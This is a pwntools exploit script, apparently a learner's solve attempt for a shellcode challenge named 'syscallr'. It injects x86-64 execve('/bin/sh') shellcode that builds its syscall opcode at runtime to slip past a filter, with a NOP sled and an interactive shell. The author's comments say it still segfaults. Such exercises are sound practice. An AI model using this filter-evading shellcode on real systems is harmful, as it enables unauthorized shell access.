
from pwn import *
from getpass import *
import logging

#context(log_level='debug')
context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']

host = "acidburn"

ip = "127.0.0.1"
path = "/challenges/shellcode/syscallr/"
prt = int(input(" insert "+host+"'s port to connect to:"))

pwd = getpass("insert "+host+"'s password:")

print("Connecting to "+host+" at "+ip+" to execute syscall")

ssh_p = ssh(host,ip,password=pwd,port= prt)

process = "."+path+"syscallr"
#r = ssh_p.process(process)

r= gdb.debug([process], ssh = ssh_p,gdbscript ='''b *get_shellcode
                                                   continue
                                                   ''')
#This code DOES NOT work, I'm jumping to the rbx,but previously I was jumping
#at the rsp, which held the modified syscall hex to avoid detection
#but it returned a SIGSEGV seg fault , what was the case ?

#possible answer : I didn't setup the stack properly, meaning that when the syscall
#was done it had the right values in the right registers but they were not properly put

CODE = '''
       mov r14,rax
       mov rbx, 0x0068732f6e69622f
       push rbx
       mov rdi,rsp
       xor rbx,rbx
       push rbx
       mov rsi,rsp
       mov rdx,rsp
       mov rax, 0x3b
       mov rbx, 0x040e
       add rbx, 0x0101
       add rsp, 0x100
       push rbx
       mov  rbx,rsp
       push r14
       leave
       ret
       jmp rbx
       '''
#comment : inside rax I had found the address for the BEGINNING OF THE call to (j_table)
#          and here in this shellcode I use that as a base to write my modified syscall among the nop sled

CODE_='''
        mov r14, rax
        mov rsp, r14
        add rsp, 0x100
        mov rbx, 0x0068732f6e69622f
        push rbx
        mov rdi,rsp
        xor rbx,rbx
        push rbx
        mov rsi,rsp
        mov rdx,rsp
        mov rax,0x3b
        mov rbx,0x040e
        add rbx,0x0101
        mov rsp, r14
        add rsp, 0x70
        push rbx
      '''


print("this is the loaded shellcode: ")
shellcode= asm(CODE_, arch="amd64")

print("======")
payload= b"\x90"*3+shellcode+b"\x90"*1000


input("Press key to inject payload: ")
r.send(payload)

r.interactive()
#from this point on the connection opens a shell for stdin/stdout
